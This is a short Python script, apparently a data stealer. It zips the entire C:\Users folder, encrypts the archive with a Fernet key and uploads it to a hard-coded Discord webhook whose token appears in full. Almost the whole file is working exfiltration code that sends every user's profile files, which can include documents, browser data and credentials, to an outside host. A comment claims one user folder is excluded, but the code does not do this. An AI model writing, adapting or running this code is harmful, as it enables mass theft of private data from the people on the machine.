import os
import zipfile
import requests
from cryptography.fernet import Fernet

# Function to generate a new Fernet key
def generate_key():
    return Fernet.generate_key()

# Function to encrypt a file using the given key
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    
    # Write the encrypted data back to a file
    encrypted_filename = file_path + ".encrypted"
    with open(encrypted_filename, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)
    
    print(f"File encrypted successfully: {encrypted_filename}")
    return encrypted_filename

# Function to zip the folder
def zip_folder(folder_path, zip_filename):
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))
    print(f"Folder zipped successfully: {zip_filename}")

# Function to upload the encrypted file to Discord
def upload_to_discord(file_path, webhook_url):
    with open(file_path, 'rb') as file:
        response = requests.post(webhook_url, files={"file": file})
    return response.status_code

if __name__ == "__main__":
    # Set the webhook URL
    webhook_url = "https://discord.com/api/webhooks/1323437243238580255/hO8hxJ-sl9GxAdGwr8M6GqGAN3I3yLp8Jh7Vng42FjOVCbM4_vz2PuBkUAl9fZ8cGuGo"
    
    # Define the folder to scan (inside C:\Users, excluding the 'zachk' folder)
    folder_to_zip = r"C:\Users"
    
    # Define the name for the zip file
    zip_filename = "users_folder.zip"
    
    print("Zipping the folder...")
    zip_folder(folder_to_zip, zip_filename)
    
    # Generate a Fernet key (store this securely)
    key = generate_key()

    # Encrypt the zip file using the generated key
    encrypted_zip_filename = encrypt_file(zip_filename, key)
    
    # Upload the encrypted zip file to Discord
    print(f"Uploading {encrypted_zip_filename}...")
    status = upload_to_discord(encrypted_zip_filename, webhook_url)
    print(f"Upload status: {status}")
    
    # Optionally, you can save the key securely, for example:
    with open("fernet_key.key", "wb") as key_file:
        key_file.write(key)
input("Press enter to exit.")
